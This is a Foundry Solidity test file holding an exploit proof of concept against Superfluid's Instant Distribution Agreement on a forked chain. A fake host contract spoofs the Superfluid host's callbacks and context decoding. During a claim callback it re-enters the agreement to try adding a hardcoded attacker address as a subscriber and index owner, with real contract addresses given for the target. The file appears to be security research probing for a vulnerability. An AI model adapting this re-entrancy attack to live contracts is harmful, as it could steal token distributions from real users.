// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface IIDA {
    function claim(address,address,uint32,address,bytes calldata) external returns (bytes memory);
    function updateSubscription(address,uint32,address,uint128,bytes calldata) external returns (bytes memory);
    function createIndex(address,uint32,bytes calldata) external returns (bytes memory);
    function updateIndex(address,uint32,uint128,bytes calldata) external returns (bytes memory);
    function getSubscription(address,address,uint32,address) external view returns (bool,bool,uint128,uint256);
    function getIndex(address,address,uint32) external view returns (bool,uint128,uint128,uint128);
}
interface IMATICx {
    function balanceOf(address) external view returns (uint256);
    function realtimeBalanceOfNow(address) external view returns (int256,uint256,uint256);
    function upgradeByETH() external payable;
    function downgradeToETH(uint256) external;
}
interface ISuperfluid {
    function callAgreement(address,bytes calldata,bytes calldata) external returns (bytes memory);
}

/// @notice ExploitHost that during claim callback, tries to add attacker as subscriber
contract ExploitHost3 is Test {
    address public ida;
    address public maticx;
    address public attacker;
    bool public phase2;
    
    constructor(address _ida, address _mx, address _atk) {
        ida = _ida; maticx = _mx; attacker = _atk;
    }
    
    function getAppManifest(address) external pure returns (bool,bool,uint256) { return (true,false,0); }
    function isApp(address) external pure returns (bool) { return true; }
    function isCtxValid(bytes calldata) external pure returns (bool) { return true; }
    function decodeCtx(bytes memory) external view returns (uint8,uint8,uint256,address,bytes4,bytes memory,uint256,uint256,int256,address,address) {
        return (0,1,0,attacker,bytes4(0),"",0,0,0,address(0),address(0));
    }
    function appCallbackPush(bytes calldata,address,uint256,int256,address) external returns (bytes memory) { return ""; }
    function appCallbackPop(bytes calldata,int256) external returns (bytes memory) { return ""; }
    
    function callAppBeforeCallback(address, bytes calldata, bool, bytes calldata) external returns (bytes memory) {
        if (!phase2) {
            phase2 = true;
            // During claim callback, try to call updateSubscription through IDA directly
            // This would use FakeHost as the "Host" for authorizeTokenAccess
            bytes memory ctx = abi.encode(
                abi.encode(uint256(1<<32),uint256(0),attacker,bytes4(0),bytes("")),
                abi.encode(uint256(0),int256(0),address(0),address(0))
            );
            
            // Try updateSubscription - add attacker as subscriber to PUB's index
            address PUB = 0xcaB28480ab5c1E133e9B7FC67E030B8DCC2A1d24;
            try IIDA(ida).updateSubscription(maticx, 1, attacker, 1000, ctx) {
                emit log("updateSubscription in callback SUCCEEDED!");
            } catch (bytes memory err) {
                emit log("updateSubscription in callback FAILED");
            }
            
            // Try createIndex - create index under attacker
            try IIDA(ida).createIndex(maticx, 555, ctx) {
                emit log("createIndex in callback SUCCEEDED!");
            } catch {
                emit log("createIndex in callback FAILED");
            }
        }
        return "";
    }
    
    function callAppAfterCallback(address, bytes calldata, bool, bytes calldata ctx) external returns (bytes memory) { return ctx; }

    function attack(address publisher, uint32 indexId, address subscriber) external {
        phase2 = false;
        bytes memory ctx = abi.encode(
            abi.encode(uint256(1<<32),uint256(0),address(0),bytes4(0),bytes("")),
            abi.encode(uint256(0),int256(0),address(0),address(0))
        );
        IIDA(ida).claim(maticx, publisher, indexId, subscriber, ctx);
    }
}

contract ReentryUpdateSubTest is Test {
    address constant HOST = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address constant IDA = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address constant MATICx = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address constant PUB = 0xcaB28480ab5c1E133e9B7FC67E030B8DCC2A1d24;
    address constant SUB = 0x9C6B5FdC145912dfe6eE13A667aF3C5Eb07CbB89;
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
    }

    function test_reentryUpdateSub() public {
        ExploitHost3 eh = new ExploitHost3(IDA, MATICx, ATTACKER);
        eh.attack(PUB, 1, SUB);
        
        // Check if attacker got a subscription
        (bool exist,,uint128 units,) = IIDA(IDA).getSubscription(MATICx, PUB, 1, ATTACKER);
        console.log("Attacker sub exists:", exist, "units:", units);
        
        // Check if attacker has an index
        (bool iExist,,,) = IIDA(IDA).getIndex(MATICx, ATTACKER, 555);
        console.log("Attacker index exists:", iExist);
    }
}
